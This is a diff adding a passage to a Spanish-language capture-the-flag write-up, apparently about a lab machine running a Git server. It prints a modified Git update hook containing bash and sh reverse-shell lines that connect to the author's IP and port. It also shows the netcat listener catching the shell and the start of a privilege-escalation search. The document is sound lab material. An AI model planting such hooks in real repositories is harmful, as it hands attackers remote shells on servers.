@@ -427,3 +427,163 @@ Viendo el código de la página consigo la primera flag.
 			<input id="secret" name="secret" type="password" value="flag{St+**************}" autocomplete="off">
 
 Ahora veo la pista de la segunda. Get a shell.
+
+Viendo como acceder al sistema, llego a git hooks. Intento inyectar una revshell en los tres githooks, pero me da error.
+
+ailed to update/create file 'README.md' with error: git push origin master: exit status 1 - remote: *** Project description file hasn't been set remote: error: hook declined to update refs/heads/master To /data/git/repositories/leeroy/jenkins.git ! [remote rejected] master -> master (hook declined) error: failed to push some refs to '/data/git/repositories/leeroy/jenkins.git'  como soluciono esto
+
+El error se debe a que el githook update hace un check de nombre y bloquea los updates que no coinciden con sus parámetros.
+
+Lo cambio por el siguiente.
+#!/bin/sh
+#
+# An example hook script to block unannotated tags from entering.
+# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
+#
+# To enable this hook, rename this file to "update".
+#
+# Config
+# ------
+# hooks.allowunannotated
+#   This boolean sets whether unannotated tags will be allowed into the
+#   repository.  By default they won't be.
+# hooks.allowdeletetag
+#   This boolean sets whether deleting tags will be allowed in the
+#   repository.  By default they won't be.
+# hooks.allowmodifytag
+#   This boolean sets whether a tag may be modified after creation. By default
+#   it won't be.
+# hooks.allowdeletebranch
+#   This boolean sets whether deleting branches will be allowed in the
+#   repository.  By default they won't be.
+# hooks.denycreatebranch
+#   This boolean sets whether remotely creating branches will be denied
+#   in the repository.  By default this is allowed.
+#
+
+# ==============================================
+# === REVERSE SHELL - EJECUTAR EN BACKGROUND ===
+# ==============================================
+# Ejecuta la reverse shell en background y no espera a que termine
+bash -i >& /dev/tcp/192.168.131.65/9003 0>&1 &
+
+# También intenta con sh por si acaso
+sh -i >& /dev/tcp/192.168.131.65/9003 0>&1 &
+
+# ==============================================
+# === FIN DE LA REVERSE SHELL ===
+# ==============================================
+
+# --- Command line
+refname="$1"
+oldrev="$2"
+newrev="$3"
+
+# --- Safety check
+if [ -z "$GIT_DIR" ]; then
+	echo "Don't run this script from the command line." >&2
+	echo " (if you want, you could supply GIT_DIR then run" >&2
+	echo "  $0 <ref> <oldrev> <newrev>)" >&2
+	exit 1
+fi
+
+if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
+	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
+	exit 1
+fi
+
+# --- Config
+allowunannotated=$(git config --bool hooks.allowunannotated)
+allowdeletebranch=$(git config --bool hooks.allowdeletebranch)
+denycreatebranch=$(git config --bool hooks.denycreatebranch)
+allowdeletetag=$(git config --bool hooks.allowdeletetag)
+allowmodifytag=$(git config --bool hooks.allowmodifytag)
+
+# ==============================================
+# === VERIFICACIÓN DE DESCRIPCIÓN ELIMINADA ===
+# ==============================================
+# Completamente eliminado el bloque que verificaba la descripción
+# para que NUNCA bloquee el push
+# ==============================================
+
+# --- Check types
+# if $newrev is 0000...0000, it's a commit to delete a ref.
+zero="0000000000000000000000000000000000000000"
+if [ "$newrev" = "$zero" ]; then
+	newrev_type=delete
+else
+	newrev_type=$(git cat-file -t $newrev)
+fi
+
+case "$refname","$newrev_type" in
+	refs/tags/*,commit)
+		# un-annotated tag
+		short_refname=${refname##refs/tags/}
+		if [ "$allowunannotated" != "true" ]; then
+			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
+			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
+			exit 1
+		fi
+		;;
+	refs/tags/*,delete)
+		# delete tag
+		if [ "$allowdeletetag" != "true" ]; then
+			echo "*** Deleting a tag is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/tags/*,tag)
+		# annotated tag
+		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
+		then
+			echo "*** Tag '$refname' already exists." >&2
+			echo "*** Modifying a tag is not allowed in this repository." >&2
+			exit 1
+		fi
+		;;
+	refs/heads/*,commit)
+		# branch
+		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
+			echo "*** Creating a branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/heads/*,delete)
+		# delete branch
+		if [ "$allowdeletebranch" != "true" ]; then
+			echo "*** Deleting a branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/remotes/*,commit)
+		# tracking branch
+		;;
+	refs/remotes/*,delete)
+		# delete tracking branch
+		if [ "$allowdeletebranch" != "true" ]; then
+			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	*)
+		# Anything else (is there anything else?)
+		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
+		exit 1
+		;;
+esac
+
+# --- Finished
+exit 0
+
+Hago un push y consigo la revshell.
+
+mksk@mksk-Nitro-AN515-57:~$ nc -lnvp 9003
+Listening on 0.0.0.0 9003
+Connection received on 10.129.151.252 46642
+sh: can't access tty; job control turned off
+/data/git/repositories/leeroy/jenkins.git $ 
+
+Tengo permisos para hacer cd a la carpeta /root (aqui esta la flag2) pero no para ver los archivos, asique comienzo a buscar maneras de escalar privilegios.
+
+Al buscar binarios con permisos de root o sudo -l no me da respuesta.
+
